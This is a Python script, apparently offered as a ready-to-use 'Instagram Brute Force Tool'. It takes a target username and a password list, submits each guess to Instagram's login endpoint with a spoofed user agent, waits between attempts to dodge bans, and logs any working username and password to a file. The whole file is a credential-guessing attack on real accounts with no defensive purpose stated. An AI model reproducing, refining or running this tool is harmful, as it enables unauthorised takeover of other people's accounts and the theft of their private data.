import os
import requests
from user_agent import generate_user_agent
from colorama import Fore, Style, init
import time

# Initialize colorama for Windows compatibility
init(autoreset=True)

def install_libraries():
    """Install required libraries."""
    os.system("pip install requests user_agent colorama")

def draw_logo():
    """Display the logo in blue."""
    logo = f"""
{Fore.BLUE}{Style.BRIGHT}
███████╗██╗     ██████╗ ███████╗███████╗██████╗  ██████╗ 
██╔════╝██║     ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗
█████╗  ██║     ██████╔╝█████╗  █████╗  ██████╔╝██████╔╝
██╔══╝  ██║     ██╔═══╝ ██╔══╝  ██╔══╝  ██╔══██╗██╔══██╗
███████╗███████╗██║     ███████╗███████╗██║  ██║██║  ██║
╚══════╝╚══════╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{Style.RESET_ALL}
    """
    print(logo)

def brute_force(username, password_file):
    """Perform brute force attack on Instagram."""
    try:
        with open(password_file, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File {password_file} not found!")
        return

    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'user-agent': generate_user_agent(),
        'x-csrftoken': 'missing'  # Placeholder, dynamic CSRF tokens can be implemented
    }

    total_passwords = len(passwords)
    print(f"{Fore.YELLOW}[!] Starting brute force attack on @{username}")
    print(f"{Fore.YELLOW}[!] Total passwords to test: {total_passwords}")

    for i, password in enumerate(passwords, 1):
        password = password.strip()
        data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        try:
            response = requests.post(url, headers=headers, data=data)
            if "userId" in response.text:
                print(f"{Fore.GREEN}[✓] Pass: {password} is correct!")
                with open("success_log.txt", "a") as log_file:
                    log_file.write(f"{username}:{password}\n")
                break
            else:
                print(f"{Fore.RED}[✕] Pass: {password} is incorrect!")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Error: {e}")
            break

        # Display progress and avoid bans
        print(f"{Fore.CYAN}[{i}/{total_passwords}] Attempted password: {password}")
        time.sleep(1)  # Add delay to avoid bans

    print(f"{Fore.YELLOW}[!] Brute force attack completed.")

def main():
    install_libraries()  # Install the required libraries
    draw_logo()  # Draw the logo

    print("Instagram Brute Force Tool")
    
    # Input login data
    username = input(f"{Fore.BLUE}Enter the Instagram username to test: @{Style.RESET_ALL}")
    password_file = input(f"{Fore.BLUE}Enter the name of the passwords file: {Style.RESET_ALL}")

    brute_force(username, password_file)

if __name__ == "__main__":
    main()